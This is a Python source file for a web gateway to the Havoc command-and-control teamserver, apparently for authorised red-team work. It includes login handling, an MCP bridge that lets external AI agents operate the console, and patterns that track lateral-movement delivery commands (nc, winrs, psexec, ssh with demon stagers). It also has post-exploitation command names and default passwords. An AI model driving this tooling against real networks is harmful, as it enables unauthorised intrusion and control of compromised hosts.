#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Havoc Web 控制台网关。

浏览器 <-> 本网关 (aiohttp, :8081) <-> teamserver (wss://127.0.0.1:40056/havoc/)

仅用于已获得明确授权的安全测试环境。
"""
from __future__ import annotations

import argparse
import asyncio
import base64
import hashlib
import hmac
import io
import ipaddress
import json
import logging
import os
import re
import secrets
import shlex
import sys
import tarfile
import time
from pathlib import Path
from typing import Any, Optional
from urllib.parse import quote

import aiohttp
from aiohttp import WSMsgType, web

BASE_DIR = Path(__file__).resolve().parent
if str(BASE_DIR) not in sys.path:
    sys.path.insert(0, str(BASE_DIR))

from commands import (
    CommandError,
    SessionRef,
    UPLOAD_DIR,
    build,
    build_proc_create,
    help_rows,
    parse_argv,
    render_command_help,
    render_help,
    sub_description_for,
)
from demon_commands import MODULE_BY_NAME, REGISTERED_BY_KEY, REGISTERED_COMMANDS, STATIC_BY_NAME
from filemanager import EDIT_MAX_BYTES, FileManager, FileOpError
import linux_compat
from mcp_server import (
    MCPBridge,
    SERVER_NAME as MCP_SERVER_NAME,
    SERVER_VERSION as MCP_SERVER_VERSION,
    SUPPORTED_PROTOCOLS as MCP_PROTOCOLS,
)
from havoc_client import HavocClient
from relay_builder import RelayBuilder
from state import AppState, local_time_str, now_ts
from transports import TRANSPORT_MODES, TransportManager, normalize_mode

BASE_DIR = Path(__file__).resolve().parent
STATIC_DIR = BASE_DIR / "static"
HELP_FREEFORM = {
    # 第一个参数本身就是路径 / 查询语句 / 文件名的命令：`cat help` 表示读名为 help 的文件
    "cat", "dir", "shell", "powershell", "powerpick", "inline-execute", "ldapsearch",
    "wmi_query", "nslookup", "upload", "download", "cd", "mkdir", "mv", "cp", "remove",
    "netuser", "cacls", "netshares", "netsharesAdmin", "screenshot", "adcs_request",
    "reg_query", "reg_query_recursive", "reg_delete", "reg_set", "reg_save",
    "get_password_policy",
}

LOGIN_COOKIE = "havoc_web"
# 这些接口会改变 MCP 自身运行态或接触明文令牌，只允许浏览器登录态（cookie），
# 不接受 MCP/Python 令牌，避免外部 Agent 自己给自己启停或读取令牌。
MCP_COOKIE_ONLY_PATHS = frozenset({
    "/api/mcp/start",
    "/api/mcp/stop",
    "/api/mcp/port",
    "/api/mcp/token",
    "/api/mcp/token/rotate",
})
log = logging.getLogger("havoc-webui")

# 投递链自动识别：命令里出现一键上线脚本，且能从 nc/winrs/ssh/psexec 等形态中
# 提取出目标地址时，记录“源会话 → 目标 IP → task”，新会话上线后按 IP/时间匹配。
DELIVERY_STAGER_RE = re.compile(
    r"(?:/slt\b|/swt\b|payloads/demon\.[A-Za-z0-9]+\.(?:exe|elf)\b)", re.I)
IPV4_RE = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
DELIVERY_TARGET_PATTERNS = (
    r"\bnc(?:\.exe)?\b[^\n|;&]*?\b((?:\d{1,3}\.){3}\d{1,3})\b",
    r"\bwinrs(?:\.exe)?\b[^\n]*?-r:(?:https?://)?((?:\d{1,3}\.){3}\d{1,3})",
    r"\bssh(?:\.exe)?\b[^\n]*?@((?:\d{1,3}\.){3}\d{1,3})",
    r"-ComputerName\s+['\"]?((?:\d{1,3}\.){3}\d{1,3})",
    r"\bpsexec(?:\.exe)?\b[^\n]*?((?:\d{1,3}\.){3}\d{1,3})",
)


def _is_ipv4(text: str) -> bool:
    try:
        ipaddress.ip_address(str(text))
        return True
    except ValueError:
        return False


def delivery_target_from_command(line: str) -> Optional[str]:
    """从投递命令中提取目标地址；不是投递命令时返回 None。"""
    line = line or ""
    if not DELIVERY_STAGER_RE.search(line):
        return None
    for pattern in DELIVERY_TARGET_PATTERNS:
        match = re.search(pattern, line, re.I)
        if match and _is_ipv4(match.group(1)):
            return match.group(1)
    # 兜底：排除 URL 里的 stager 主机与本机地址，只剩一个候选时采用。
    exclude: set[str] = set()
    for match in re.finditer(r"https?://([^/\s'\"]+)", line, re.I):
        host = match.group(1).rsplit("@", 1)[-1].split(":")[0].strip("[]")
        if _is_ipv4(host):
            exclude.add(host)
    candidates: list[str] = []
    for ip in IPV4_RE.findall(line):
        if not _is_ipv4(ip):
            continue
        if ip in exclude or ip in ("127.0.0.1", "0.0.0.0", "255.255.255.255"):
            continue
        if ip not in candidates:
            candidates.append(ip)
    return candidates[0] if len(candidates) == 1 else None


# ---------------------------------------------------------------- 配置 / 鉴权

class Auth:
    """Web 登录 + HMAC 签名 cookie（网关重启后登录态仍有效）。"""

    def __init__(self, user: str, password: str, ttl_hours: float, secret_path: Path):
        self.user = user
        self.password = password
        self.ttl = max(1.0, ttl_hours) * 3600
        self.failures: dict[str, list[float]] = {}
        self.secret = self._load_secret(secret_path)

    @staticmethod
    def _load_secret(path: Path) -> bytes:
        path.parent.mkdir(parents=True, exist_ok=True)
        if path.exists():
            try:
                data = path.read_bytes().strip()
                if len(data) >= 32:
                    return data
            except OSError:
                pass
        data = secrets.token_bytes(48)
        path.write_bytes(data)
        try:
            os.chmod(path, 0o600)
        except OSError:
            pass
        return data

    def check_credentials(self, user: str, password: str) -> bool:
        return secrets.compare_digest(user or "", self.user) and secrets.compare_digest(password or "", self.password)

    def rate_limited(self, ip: str) -> bool:
        now = time.time()
        recent = [t for t in self.failures.get(ip, []) if now - t < 60]
        self.failures[ip] = recent
        return len(recent) >= 8

    def note_failure(self, ip: str) -> None:
        self.failures.setdefault(ip, []).append(time.time())

    def _sign(self, payload: str) -> str:
        return hmac.new(self.secret, payload.encode(), hashlib.sha256).hexdigest()

    def issue(self, user: str) -> tuple[str, dict]:
        expires = time.time() + self.ttl
        record = {"user": user, "expires": expires, "created": time.time()}
        payload = f"{user}:{int(expires)}"
        token = base64.urlsafe_b64encode(f"{payload}:{self._sign(payload)}".encode()).decode()
        return token, record

    def resolve(self, token: Optional[str]) -> Optional[dict]:
        if not token:
            return None
        try:
            raw = base64.urlsafe_b64decode(token.encode()).decode()
            user, exp, sig = raw.rsplit(":", 2)
            payload = f"{user}:{exp}"
            if not hmac.compare_digest(sig, self._sign(payload)):
                return None
            expires = float(exp)
        except Exception:
            return None
        if expires < time.time():
            return None
        return {"user": user, "expires": expires, "created": 0.0}

    def revoke(self, token: Optional[str]) -> None:
        # 签名 token 无法在无状态情况下吊销；退出登录清除 cookie 即可。
        return None

    def prune(self) -> None:
        return None


def load_config(path: Path) -> dict:
    with path.open("r", encoding="utf-8") as fh:
        return json.load(fh)


# ---------------------------------------------------------------- 应用

class Gateway:
    def __init__(self, cfg: dict, config_path: Optional[Path] = None):
        self.cfg = cfg
        # 配置文件路径：MCP 管理页修改监听端口时写回 mcp.port。
        self.config_path = Path(config_path) if config_path else None
        self.limits = cfg.get("limits", {})
        self.state = AppState(
            events_limit=int(self.limits.get("events", 3000)),
            console_limit=int(self.limits.get("console_per_session", 3000)),
            task_limit_per_demon=int(self.limits.get("tasks_per_session", 400)),
            data_dir=BASE_DIR / "data",
        )
        # 新会话事件钩子（Python RegisterCallback / Event.OnNewSession）
        self.state.new_session_hook = self._on_new_session
        # 待匹配的投递命令（源会话 → 目标 IP），新会话上线后消费。
        self.delivery_pending: list[dict] = []
        self.stager_url = (cfg.get("stager") or {}).get("url", "http://127.0.0.1:9901")
        self.store_cache: dict = {"ts": 0.0, "source": "", "modules": []}
        self.extensions_dir = BASE_DIR / "data" / "extensions"
        self.modules_dir = BASE_DIR.parent / "havoc-src" / "client" / "Modules"
        self.pysdk_dir = BASE_DIR / "pysdk"
        self.python_enabled = bool((cfg.get("python") or {}).get("enabled", True))
        self.python_token = secrets.token_urlsafe(32)
        # MCP：把 webui 的全部 HTTP 能力通过 /mcp 与 stdio 暴露给外部 MCP 客户端。
        self.mcp_cfg = cfg.get("mcp") or {}
        self.mcp_enabled = bool(self.mcp_cfg.get("enabled", True))
        self.mcp_token, self.mcp_token_path = self._load_mcp_token()
        self.mcp_bridge: Optional[MCPBridge] = None
        # 运行态与配置总开关分离：mcp_enabled=false 时永远不能启动；否则运行态
        # 持久化到 data/mcp_state.json，网关重启后恢复上次的启停状态。
        self.mcp_state_path = self._mcp_state_path()
        self.mcp_running = False
        self.mcp_started_at = 0.0
        self.mcp_last_error = ""
        # 独立监听端口：0 表示复用 WebUI 端口；>0 时 MCP 只在 mcp.host:mcp.port 上服务。
        self.mcp_port = self._mcp_configured_port()
        self.mcp_listener: Optional[MCPPortListener] = None
        self.mcp_listener_host = ""
        self.mcp_ssl_context = None
        if self.mcp_enabled:
            self.mcp_running = self._load_mcp_running()
            if self.mcp_running:
                self.mcp_started_at = time.time()
        self.repl_proc: Optional[asyncio.subprocess.Process] = None
        self.repl_lock = asyncio.Lock()
        # 常驻 Python 宿主：控制台与脚本共享同一个解释器（懒启动）。
        self.python_host: Optional[asyncio.subprocess.Process] = None
        self.host_lock = asyncio.Lock()
        self._host_stderr_task: Optional[asyncio.Task] = None
        self.store_mirror = (cfg.get("store") or {}).get("mirror", "https://ghfast.top/")
        self.python_registry_path = BASE_DIR / "data" / "python_commands.json"
        self.python_modules_path = BASE_DIR / "data" / "python_modules.json"
        self.scripts_config_path = BASE_DIR / "data" / "scripts.json"
        self.uploads_dir = self.extensions_dir / "_uploads"
        self.python_lock = asyncio.Lock()
        self.autoload_scripts: list[str] = self._load_autoload()
        self._load_python_registry()
        # 客户端启动时通过 config.toml 加载的 15 个模块命令。这里作为内置命令表，
        # 用子进程执行对应的 Python 函数（BOF 仍然经 teamserver 下发）。
        self.builtin_commands: dict[str, dict] = {}
        for entry in REGISTERED_COMMANDS:
            item = dict(entry)
            key = f"{entry['module']} {entry['command']}" if entry.get("module") else entry["command"]
            script = Path(item.get("script", ""))
            if not script.is_absolute():
                script = BASE_DIR.parent / script
            item["script"] = str(script)
            item["key"] = key
            item["builtin"] = True
            self.builtin_commands[key] = item
        ts = cfg["teamserver"]
        web_cfg = cfg["web"]
        self.auth = Auth(web_cfg.get("user", "admin"), web_cfg.get("password", "havoc1234"),
                         float(web_cfg.get("session_ttl_hours", 12)), BASE_DIR / "run" / "secret.key")
        self.shell_utf8 = bool(ts.get("shell_utf8", True))
        self.client = HavocClient(
            self.state,
            host=ts.get("host", "127.0.0.1"),
            port=int(ts.get("port", 40056)),
            user=ts.get("user", "Neo"),
            password=ts.get("password", "password1234"),
            path=ts.get("path", "/havoc/"),
        )
        self.started = now_ts()
        self.ws_clients: set[web.WebSocketResponse] = set()
        self._bg_tasks: list[asyncio.Task] = []
        self.fileman = FileManager(self)
        self.transports = TransportManager(
            BASE_DIR / "data",
            publish=self._publish_transport,
            event=self._transport_event,
        )
        self.relay_builder = RelayBuilder(BASE_DIR)

    # ---------------- 中间件 ----------------

    @web.middleware
    async def security_middleware(self, request: web.Request, handler):
        origin = request.headers.get("Origin")
        if origin:
            from urllib.parse import urlparse
            if urlparse(origin).netloc.lower() != (request.headers.get("Host") or "").lower():
                return web.json_response({"error": "forbidden", "message": "来源不被允许"}, status=403)
        response = await handler(request)
        response.headers.setdefault("X-Content-Type-Options", "nosniff")
        response.headers.setdefault("X-Frame-Options", "DENY")
        response.headers.setdefault("Referrer-Policy", "no-referrer")
        if request.path.startswith("/static/"):
            response.headers["Cache-Control"] = "no-cache"
        response.headers.setdefault(
            "Content-Security-Policy",
            "default-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; "
            "script-src 'self'; connect-src 'self' ws: wss:; base-uri 'none'; form-action 'self'")
        return response

    @web.middleware
    async def auth_middleware(self, request: web.Request, handler):
        path = request.path
        public = path in ("/", "/index.html", "/login", "/api/login", "/api/health", "/favicon.ico")
        public = public or path.startswith("/static/") or path.startswith("/assets/")
        if public:
            return await handler(request)

        if path == "/mcp":
            # MCP Streamable HTTP：独立于浏览器 cookie，使用 Bearer 访问令牌。
            if not self.mcp_enabled:
                return web.json_response({"error": "disabled", "message": "MCP 已关闭"}, status=404)
            if self.mcp_port > 0:
                # 管理页把 MCP 切到了独立端口：WebUI 端口不再提供 /mcp。
                host = request.url.host
                if ":" in host and not host.startswith("["):
                    host = f"[{host}]"
                return web.json_response(
                    {"error": "moved", "port": self.mcp_port,
                     "message": f"MCP 已使用独立端口 {self.mcp_port}，请改用 "
                                f"http{'s' if request.secure else ''}://{host}"
                                f":{self.mcp_port}/mcp"},
                    status=404)
            if not self._mcp_effective_running():
                # 配置仍启用，但操作员在管理页停止了服务。路由保持挂载，
                # 用运行态 gate 返回明确的 503，客户端重新 initialize 前都会失败。
                return web.json_response(
                    {"jsonrpc": "2.0", "id": None,
                     "error": {"code": -32002,
                               "message": "MCP 已停止：请在 Web 控制台「MCP 管理」页启动后重试"}},
                    status=503, headers={"Retry-After": "5"})
            if not self._token_ok(request):
                response = web.json_response(
                    {"error": "unauthorized", "message": "需要 MCP 访问令牌（Authorization: Bearer）"},
                    status=401)
                response.headers["WWW-Authenticate"] = 'Bearer realm="havoc-mcp", error="invalid_token"'
                return response
            return await handler(request)

        if path.startswith("/api/"):
            if path in MCP_COOKIE_ONLY_PATHS:
                # 启停与令牌接口只认浏览器登录态，令牌调用不能改自己的运行态。
                record = self.auth.resolve(request.cookies.get(LOGIN_COOKIE))
                if record is None:
                    return web.json_response(
                        {"error": "unauthorized", "message": "此操作需要 Web 登录操作员"}, status=401)
                request["user"] = record["user"]
                return await handler(request)
            identity = self._token_identity(request)
            if identity:
                # 令牌调用没有浏览器 cookie，这里补上操作员身份，审计事件显示来源。
                request["user"] = identity
                return await handler(request)

        if path.startswith("/api/") or path == "/ws":
            record = self.auth.resolve(request.cookies.get(LOGIN_COOKIE))
            if record is None:
                if path == "/ws":
                    return web.Response(status=401, text="unauthorized")
                return web.json_response({"error": "unauthorized", "message": "请先登录"}, status=401)
            request["user"] = record["user"]
            response = await handler(request)
            return response

        return await handler(request)

    @web.middleware
    async def mcp_listener_middleware(self, request: web.Request, handler):
        """独立端口专用：只暴露 /mcp，鉴权顺序与主网关一致。"""
        if request.path != "/mcp":
            return web.json_response({"error": "not_found", "message": "此端口只提供 /mcp"}, status=404)
        if not self.mcp_enabled or self.mcp_port <= 0:
            return web.json_response({"error": "disabled", "message": "MCP 未启用独立端口"}, status=404)
        if not self._mcp_effective_running():
            return web.json_response(
                {"jsonrpc": "2.0", "id": None,
                 "error": {"code": -32002,
                           "message": "MCP 已停止：请在 Web 控制台「MCP 管理」页启动后重试"}},
                status=503, headers={"Retry-After": "5"})
        if not self._token_ok(request):
            response = web.json_response(
                {"error": "unauthorized", "message": "需要 MCP 访问令牌（Authorization: Bearer）"},
                status=401)
            response.headers["WWW-Authenticate"] = 'Bearer realm="havoc-mcp", error="invalid_token"'
            return response
        return await handler(request)

    # ---------------- 页面 ----------------

    async def index(self, request: web.Request) -> web.StreamResponse:
        return web.FileResponse(STATIC_DIR / "index.html", headers={"Cache-Control": "no-store"})

    # ---------------- 鉴权 API ----------------

    async def api_login(self, request: web.Request) -> web.Response:
        try:
            body = await request.json()
        except Exception:
            return web.json_response({"error": "bad_request", "message": "请求格式错误"}, status=400)
        user = str(body.get("username", ""))
        password = str(body.get("password", ""))
        ip = request.remote or "?"
        if self.auth.rate_limited(ip):
            return web.json_response({"error": "rate_limited", "message": "尝试过于频繁，请稍后再试"}, status=429)
        if not self.auth.check_credentials(user, password):
            self.auth.note_failure(ip)
            log.warning("web login failed from %s (user=%r)", ip, user)
            await asyncio.sleep(0.4)
            return web.json_response({"error": "invalid_credentials", "message": "用户名或密码错误"}, status=401)
        token, record = self.auth.issue(user)
        log.info("web login ok from %s (user=%s)", ip, user)
        response = web.json_response({"ok": True, "user": user, "expires": record["expires"]})
        response.set_cookie(LOGIN_COOKIE, token, max_age=int(self.auth.ttl), httponly=True,
                            samesite="Lax", path="/")
        return response

    async def api_logout(self, request: web.Request) -> web.Response:
        self.auth.revoke(request.cookies.get(LOGIN_COOKIE))
        response = web.json_response({"ok": True})
        response.del_cookie(LOGIN_COOKIE, path="/")
        return response

    async def api_me(self, request: web.Request) -> web.Response:
        return web.json_response({"user": request["user"], "webui": {
            "version": "1.0",
            "started": local_time_str(self.started),
        }})

    # ---------------- MCP 管理 API ----------------

    def _mcp_status_payload(self, request: Optional[web.Request] = None) -> dict:
        """MCP 管理页的完整状态。浏览器、MCP 令牌都可读取（只读，不含明文令牌）。"""
        bridge = self.mcp_bridge
        running = self._mcp_effective_running()
        started_at = float(getattr(bridge, "started_at", 0.0) or 0.0) if running else 0.0
        uptime = max(0, int(time.time() - started_at)) if started_at > 0 else 0
        endpoint = self._mcp_endpoint(request)
        gateway_base = bridge.client.base_url if bridge else _self_base_url(self.cfg)
        tools = bridge.core.tool_names() if bridge else []
        resources = [res.uri for res in bridge.core.registry.resources] if bridge else []
        prompts = [prompt.name for prompt in bridge.core.registry.prompts] if bridge else []
        token_file = (str(self.mcp_token_path) if self.mcp_token_path
                      else "(config.json → mcp.token)")
        token_source = "file" if self.mcp_token_path else "config"
        stdio_script = str(BASE_DIR / "mcp_server.py")
        state_word = ("disabled" if not self.mcp_enabled
                      else ("running" if running else "stopped"))
        web_port = int((self.cfg.get("web") or {}).get("port", 8081))
        return {
            "enabled": self.mcp_enabled,
            "running": running,
            "status": state_word,
            "server": {"name": MCP_SERVER_NAME, "version": MCP_SERVER_VERSION,
                       "title": "Havoc Web 控制台 MCP"},
            "started_at": started_at,
            "started_at_text": local_time_str(started_at) if started_at > 0 else "",
            "uptime": uptime,
            "endpoint": endpoint,
            "port": self.mcp_port,
            "web_port": web_port,
            "effective_port": self.mcp_port or web_port,
            "port_mode": "dedicated" if self.mcp_port > 0 else "shared",
            "port_persisted": self.config_path is not None,
            "listener_active": bool(self.mcp_port > 0 and self.mcp_listener
                                    and self.mcp_listener.port == self.mcp_port),
            "transport": "streamable-http",
            "protocols": list(MCP_PROTOCOLS),
            "auth": "Authorization: Bearer <token>",
            "token_file": token_file,
            "token_source": token_source,
            "token_exists": bool(self.mcp_token_path and self.mcp_token_path.exists()),
            "token_masked": self._mcp_mask_token(self.mcp_token),
            "token_can_rotate": bool(self.mcp_token_path),
            "gateway_base": gateway_base,
            "stdio_command": f"python3 {stdio_script} --stdio --url {gateway_base}",
            "tool_count": len(tools),
            "tools": tools,
            "resource_count": len(resources),
            "resources": resources,
            "prompt_count": len(prompts),
            "prompts": prompts,
            "mcp_sessions": len(bridge.sessions) if bridge else 0,
            "last_error": self.mcp_last_error,
            "state_file": str(self.mcp_state_path),
            "client_config": {
                "http": {"mcpServers": {"havoc-webui": {
                    "url": endpoint,
                    "headers": {"Authorization": "Bearer <MCP 令牌>"},
                }}},
                "stdio": {"mcpServers": {"havoc-webui": {
                    "command": "python3",
                    "args": [stdio_script, "--stdio", "--url", gateway_base],
                }}},
            },
            "recent_events": self._mcp_recent_events(20),
        }

    async def api_mcp_status(self, request: web.Request) -> web.Response:
        return web.json_response(self._mcp_status_payload(request))

    async def api_mcp_start(self, request: web.Request) -> web.Response:
        if not self.mcp_enabled:
            return web.json_response(
                {"error": "disabled",
                 "message": "MCP 已被配置禁用：请先把 config.json → mcp.enabled 改为 true 并重启网关"},
                status=409)
        bridge = self.mcp_bridge
        if bridge is None:
            return web.json_response(
                {"error": "bridge_missing", "message": "MCP 桥接未初始化，请重启网关"}, status=409)
        if bridge.running:
            return web.json_response(
                {"error": "already_running", "message": "MCP 已在运行",
                 "status": self._mcp_status_payload(request)}, status=409)
        try:
            await bridge.start()
        except Exception as exc:  # noqa: BLE001
            self.mcp_last_error = f"启动 MCP 失败：{exc}"
            self.state.add_event(self.mcp_last_error, "error", source="mcp", dedupe=False)
            log.warning("MCP start failed: %s", exc)
            return web.json_response(
                {"error": "start_failed", "message": self.mcp_last_error}, status=500)
        self.mcp_running = True
        self.mcp_started_at = bridge.started_at
        self.mcp_last_error = ""
        self._save_mcp_state()
        count = len(bridge.core.registry.tools)
        self.state.add_event(
            f"操作员 {request['user']} 启动了 MCP 服务（POST /mcp，{count} 个工具）",
            "good", source="mcp", dedupe=False)
        payload = self._mcp_status_payload(request)
        self.state.publish({"type": "mcp", "action": "start", "status": payload})
        return web.json_response({"ok": True, **payload})

    async def api_mcp_stop(self, request: web.Request) -> web.Response:
        if not self.mcp_enabled:
            return web.json_response(
                {"error": "disabled",
                 "message": "MCP 已被配置禁用：请先把 config.json → mcp.enabled 改为 true 并重启网关"},
                status=409)
        bridge = self.mcp_bridge
        if bridge is None:
            return web.json_response(
                {"error": "bridge_missing", "message": "MCP 桥接未初始化，请重启网关"}, status=409)
        if not bridge.running:
            return web.json_response(
                {"error": "not_running", "message": "MCP 已处于停止状态",
                 "status": self._mcp_status_payload(request)}, status=409)
        await bridge.stop()
        self.mcp_running = False
        self.mcp_started_at = 0.0
        self._save_mcp_state()
        self.state.add_event(
            f"操作员 {request['user']} 停止了 MCP 服务（/mcp 现在返回 503，现有 MCP 会话已失效）",
            "warn", source="mcp", dedupe=False)
        payload = self._mcp_status_payload(request)
        self.state.publish({"type": "mcp", "action": "stop", "status": payload})
        return web.json_response({"ok": True, **payload})

    async def api_mcp_port(self, request: web.Request) -> web.Response:
        """修改 MCP 监听端口：0=复用 WebUI 端口，1..65535=独立端口。仅登录 cookie。"""
        if not self.mcp_enabled:
            return web.json_response(
                {"error": "disabled", "message": "MCP 已被配置禁用"}, status=409)
        if self.mcp_bridge is None:
            return web.json_response(
                {"error": "bridge_missing", "message": "MCP 桥接未初始化，请重启网关"}, status=409)
        try:
            body = await request.json()
        except Exception:  # noqa: BLE001
            return web.json_response({"error": "bad_request", "message": "请求格式错误"}, status=400)
        raw = body.get("port") if isinstance(body, dict) else None
        if isinstance(raw, bool) or not isinstance(raw, (int, str)):
            return web.json_response({"error": "bad_port", "message": "端口必须是整数"}, status=400)
        text = str(raw).strip()
        if text.startswith("+"):
            text = text[1:]
        if not text.isdigit():
            return web.json_response({"error": "bad_port", "message": "端口必须是 0..65535 的整数"}, status=400)
        port = int(text)
        if port < 0 or port > 65535:
            return web.json_response({"error": "bad_port", "message": "端口必须是 0..65535 的整数"}, status=400)
        web_port = int((self.cfg.get("web") or {}).get("port", 8081))
        if port == web_port:
            return web.json_response(
                {"error": "port_conflict",
                 "message": f"{port} 是 WebUI 端口；如需复用 WebUI 端口请填 0"}, status=400)
        if port == self.mcp_port and (port == 0 or (
                self.mcp_listener is not None and self.mcp_listener.port == port)):
            return web.json_response({"ok": True, "unchanged": True,
                                      **self._mcp_status_payload(request)})
        if self.mcp_listener is None:
            return web.json_response(
                {"error": "listener_missing", "message": "MCP 监听管理器未启动，请重启网关"}, status=409)

        old_port = self.mcp_port
        try:
            await self.mcp_listener.apply(port)
        except Exception as exc:  # noqa: BLE001  —— 绑定失败不改变原状态
            self.mcp_last_error = f"绑定 MCP 端口 {port} 失败：{exc}"
            self.state.add_event(self.mcp_last_error, "error", source="mcp", dedupe=False)
            return web.json_response(
                {"error": "port_unavailable", "message": self.mcp_last_error}, status=409)

        persisted = False
        if self.config_path is not None:
            try:
                self._save_mcp_config_port(port)
                persisted = True
            except OSError as exc:
                # 配置写失败：回滚监听，保持原端口可用。
                try:
                    await self.mcp_listener.apply(old_port)
                except Exception:  # noqa: BLE001
                    pass
                self.mcp_last_error = f"写入 config.json 失败：{exc}"
                self.state.add_event(self.mcp_last_error, "error", source="mcp", dedupe=False)
                return web.json_response(
                    {"error": "config_write_failed", "message": self.mcp_last_error}, status=500)

        self.mcp_port = port
        self.mcp_cfg["port"] = port
        self.mcp_last_error = ""
        self.mcp_bridge.sessions.clear()
        old_text = f"{old_port}（独立）" if old_port else f"{web_port}（共享 WebUI 端口）"
        new_text = f"{port}（独立）" if port else f"{web_port}（共享 WebUI 端口）"
        self.state.add_event(
            f"操作员 {request['user']} 将 MCP 监听端口从 {old_text} 改为 {new_text}；"
            f"原有 MCP 会话已失效，客户端需重新 initialize",
            "warn", source="mcp", dedupe=False)
        payload = self._mcp_status_payload(request)
        self.state.publish({"type": "mcp", "action": "port", "status": payload})
        return web.json_response({"ok": True, "unchanged": False, "persisted": persisted, **payload})

    async def api_mcp_token_get(self, request: web.Request) -> web.Response:
        """返回完整 MCP 令牌（仅浏览器登录态）。每次读取写一条审计。"""
        if not self.mcp_enabled or not self.mcp_token:
            return web.json_response({"error": "disabled", "message": "MCP 未启用"}, status=409)
        masked = self._mcp_mask_token(self.mcp_token)
        self.state.add_event(
            f"操作员 {request['user']} 读取了 MCP 令牌（{masked}）",
            "warn", source="mcp", dedupe=False)
        return web.json_response({
            "ok": True,
            "token": self.mcp_token,
            "token_masked": masked,
            "token_file": (str(self.mcp_token_path) if self.mcp_token_path
                           else "(config.json → mcp.token)"),
            "token_source": "file" if self.mcp_token_path else "config",
        })

    async def api_mcp_token_rotate(self, request: web.Request) -> web.Response:
        """轮换令牌：写 run/mcp.token(0600)，旧令牌立即失效并清空 MCP 会话。"""
        if not self.mcp_enabled:
            return web.json_response({"error": "disabled", "message": "MCP 未启用"}, status=409)
        bridge = self.mcp_bridge
        if bridge is None:
            return web.json_response(
                {"error": "bridge_missing", "message": "MCP 桥接未初始化，请重启网关"}, status=409)
        if self.mcp_token_path is None:
            return web.json_response(
                {"error": "token_configured",
                 "message": "令牌由 config.json → mcp.token 固定，无法在页面轮换；"
                            "请改用 run/mcp.token 文件后重启网关"}, status=409)
        old_mask = self._mcp_mask_token(self.mcp_token)
        new_token = secrets.token_urlsafe(32)
        path = self.mcp_token_path
        tmp = path.with_name(path.name + ".tmp")
        try:
            path.parent.mkdir(parents=True, exist_ok=True)
            tmp.write_text(new_token + "\n", "utf-8")
            os.chmod(tmp, 0o600)
            os.replace(tmp, path)
        except OSError as exc:
            self.mcp_last_error = f"写入 MCP 令牌失败：{exc}"
            try:
                tmp.unlink()
            except OSError:
                pass
            self.state.add_event(self.mcp_last_error, "error", source="mcp", dedupe=False)
            return web.json_response(
                {"error": "write_failed", "message": self.mcp_last_error}, status=500)
        self.mcp_token = new_token
        bridge.client.token = new_token
        bridge.sessions.clear()
        await bridge.client.close()
        self.state.add_event(
            f"操作员 {request['user']} 轮换了 MCP 令牌（旧 {old_mask} → 新 "
            f"{self._mcp_mask_token(new_token)}），现有 MCP 会话已失效",
            "warn", source="mcp", dedupe=False)
        payload = self._mcp_status_payload(request)
        self.state.publish({"type": "mcp", "action": "rotate", "status": payload})
        return web.json_response({
            "ok": True,
            "token": new_token,
            "token_masked": self._mcp_mask_token(new_token),
            "token_file": str(path),
            "status": payload,
        })

    async def api_mcp_info(self, request: web.Request) -> web.Response:
        """兼容旧页面：MCP 接入信息。内部复用 /api/mcp/status。"""
        bridge = self.mcp_bridge
        if not self.mcp_enabled or bridge is None:
            return web.json_response({"enabled": False}, status=404)
        status = self._mcp_status_payload(request)
        return web.json_response({
            "enabled": True,
            "running": status["running"],
            "server": status["server"],
            "protocols": status["protocols"],
            "endpoint": "/mcp",
            "endpoint_url": status["endpoint"],
            "port": status["port"],
            "port_mode": status["port_mode"],
            "transport": status["transport"],
            "auth": status["auth"],
            "token_file": status["token_file"],
            "tool_count": status["tool_count"],
            "tools": status["tools"],
            "resources": status["resources"],
            "prompts": status["prompts"],
            "stdio_command": status["stdio_command"],
            "gateway_base": status["gateway_base"],
            "mcp_sessions": status["mcp_sessions"],
            "last_error": status["last_error"],
        })

    # ---------------- 状态 API ----------------

    async def api_health(self, request: web.Request) -> web.Response:
        return web.json_response({"ok": True, "time": local_time_str()})

    async def api_state(self, request: web.Request) -> web.Response:
        snapshot = self.state.snapshot()
        snapshot["listeners"] = self._all_listeners()
        snapshot["counts"]["listeners"] = len(snapshot["listeners"])
        snapshot["counts"]["transports"] = len(self.transports.servers)
        snapshot["transport_modes"] = TRANSPORT_MODES
        return web.json_response(snapshot)

    async def api_status(self, request: web.Request) -> web.Response:
        view = self.state.connection_view()
        view["counts"] = self.state.counts()
        view["counts"]["listeners"] = len(self._all_listeners())
        view["counts"]["transports"] = len(self.transports.servers)
        view["ws_clients"] = len(self.ws_clients)
        return web.json_response(view)

    async def api_sessions(self, request: web.Request) -> web.Response:
        return web.json_response({"sessions": list(self.state.sessions.values())})

    async def api_session(self, request: web.Request) -> web.Response:
        sid = request.match_info["sid"]
        session = self.state.sessions.get(sid)
        if not session:
            return web.json_response({"error": "not_found", "message": "会话不存在"}, status=404)
        return web.json_response({"session": session,
                                  "tasks": self.state.tasks_for(sid, 30)})

    async def api_console(self, request: web.Request) -> web.Response:
        sid = request.match_info["sid"]
        limit = min(2000, max(1, int(request.query.get("limit", "800"))))
        lines = list(self.state.console.get(sid, ()))[-limit:]
        return web.json_response({"demon": sid, "lines": lines})

    async def api_tasks(self, request: web.Request) -> web.Response:
        sid = request.match_info["sid"]
        return web.json_response({"tasks": self.state.tasks_for(sid, 100)})

    async def api_listeners(self, request: web.Request) -> web.Response:
        return web.json_response({"listeners": self._all_listeners()})

    async def api_service_listeners(self, request: web.Request) -> web.Response:
        return web.json_response({"listeners": list(self.state.service_listeners.values())})

    async def api_events(self, request: web.Request) -> web.Response:
        limit = min(3000, max(1, int(request.query.get("limit", "500"))))
        after = int(request.query.get("after", "0") or 0)
        events = [e for e in self.state.events if e["id"] > after][-limit:]
        return web.json_response({"events": events})

    async def api_help(self, request: web.Request) -> web.Response:
        command = str(request.query.get("command", "")).strip()
        sub = str(request.query.get("sub", "")).strip()
        platform = "linux" if str(request.query.get("platform", "")).lower() == "linux" else ""
        if command:
            return web.json_response({
                "help": render_command_help(command, sub or None, self.state.python_commands.values(),
                                                self.state.python_modules.values(), platform=platform),
                "command": command, "sub": sub,
            })
        return web.json_response({"help": self._help_text(platform)})

    async def api_commands(self, request: web.Request) -> web.Response:
        """命令元数据（供控制台补全 / 参数提示）。"""
        rows = []
        for name, typ, desc in help_rows(self.state.python_commands.values(),
                                             self.state.python_modules.values()):
            meta = STATIC_BY_NAME.get(name) or REGISTERED_BY_KEY.get(name)
